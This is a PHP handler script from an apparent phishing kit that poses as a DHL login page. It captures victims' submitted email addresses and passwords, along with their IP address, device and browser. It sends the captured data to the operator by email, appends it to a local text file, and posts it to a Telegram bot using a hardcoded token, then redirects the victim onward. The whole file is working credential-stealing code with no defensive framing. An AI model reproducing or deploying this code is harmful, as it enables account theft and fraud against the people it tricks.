<?php
include("../../system/os.php");
include "../email.php";
$date = date('m/d/Y h:i:s a', time());
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
if(($_POST['jeanlog'] != "") AND ($_POST['jeanpass'] != "") )
{
$hostname = gethostbyaddr($ip);
$message .= "+]###############[+] DHL LOGIN [+]###############[+\n";
$message .= "# USER ID/EMAIL : ".$_POST['jeanlog']."\n";
$message .= "# PASSWORD      : ".$_POST['jeanpass']."\n";
$message .= "# IP INFO       : $ip\n";
$message .= "# TIME/DATE     : $date\n";
$message .= "# DEVICE        : $user_os\n";
$message .= "# BROWSER       : $user_browser\n";
$message .= "+]###############[+] J E A N [+]###############[+\n";
$send = "$to";
$subject = "📦 NEW DHL VICTIM LOGIN INFO FROM = $ip";
$headers = "From: J E A N <dhl@jean8.vip>";
mail($send,$subject,$message,$headers);
file_put_contents("../../nj.txt", $message, FILE_APPEND);
function telegram_send($message) {
    $curl = curl_init();
    $api_key  = '1244123994:AAEG5OQvqUXTvyMmc4QWOvgYKIxy1ofq55g';
    $chat_id  = '1128003836';
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
}


telegram_send(urlencode($message));
echo "<meta http-equiv='refresh' content='0; url=../../address.php'/>";
}
	else {
     echo "<meta http-equiv='refresh' content='0; ../../address.php' />";
}

?>